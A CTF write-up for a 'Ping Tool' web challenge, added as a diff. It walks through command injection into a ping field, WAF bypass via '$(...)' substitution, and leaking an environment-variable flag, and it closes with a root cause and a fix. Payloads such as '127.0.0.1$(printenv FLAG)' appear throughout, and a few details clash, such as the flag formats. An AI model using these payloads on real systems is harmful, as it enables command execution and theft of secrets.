@@ -1,0 +1,84 @@
+# CTF Writeup: Ping Tool
+
+**Challenge Name:** Ping Tool
+**Category:** Web / Command Injection
+**Flag Format:** MythX{...}
+
+### Challenge Description
+
+A web app allows users to input an IP address and executes `ping <input>`. A WAF blocks shell metacharacters like `;`, `&`, `|`, but the objective is still to retrieve the flag.
+
+---
+
+### Solution
+
+#### Step 1: Reconnaissance
+
+- App input field: "Enter an IP address to ping".
+- Assumed backend uses:
+  - `system("ping " + input)`
+  - or `/bin/sh -c "ping $input"`
+
+#### Step 2: Test Injection Payloads
+
+- Common payloads blocked by WAF:
+  - `127.0.0.1;id`
+  - `127.0.0.1 && id`
+  - `127.0.0.1 | id`
+
+- WAF likely blocks: `;`, `&`, `|`.
+
+#### Step 3: Bypass via Command Substitution
+
+- Use shell substitution: `$(command)`
+- Test payload: `127.0.0.1$(id)`
+
+- Server response:
+  - `ping: groups=0(root): Name or service not known`
+
+- Interpreted as command executed: `ping 127.0.0.1uid=0(root) gid=0(root) groups=0(root)`.
+- Confirms command execution via `$()` substitution.
+
+#### Step 4: Locate Flag
+
+- Search for flag in common locations:
+  - `/flag` file
+  - environment variable `FLAG`
+
+- Enumerate env vars:
+  - `127.0.0.1$(env)`
+- Response exposed environment variables (e.g., `CTF7_97A27E6B_SVC_PORT_5000_TCP_PROTO=tcp`).
+
+#### Step 5: Extract Flag
+
+- Payload: `127.0.0.1$(printenv FLAG)`
+- If `FLAG=ctf7{example_flag}`:
+  - expanded as `ping 127.0.0.1ctf7{example_flag}`
+- Error output leaks flag:
+  - `ping: 127.0.0.1ctf7{example_flag}: Name or service not known`
+
+---
+
+### Root Cause
+
+- Input passed into shell command.
+- Using `os.system("ping " + input)` allows shell expansion.
+- WAF blocked common separators but not `$()`.
+
+---
+
+### Secure Fix
+
+- Avoid shell interpretation:
+  - `subprocess.run(["ping", input])`
+- Additional hardening:
+  - strict IP validation
+  - avoid shell execution entirely
+
+---
+
+### Final Payload
+
+- `127.0.0.1$(printenv FLAG)`
+
+- This retrieves and leaks the flag via ping error output.
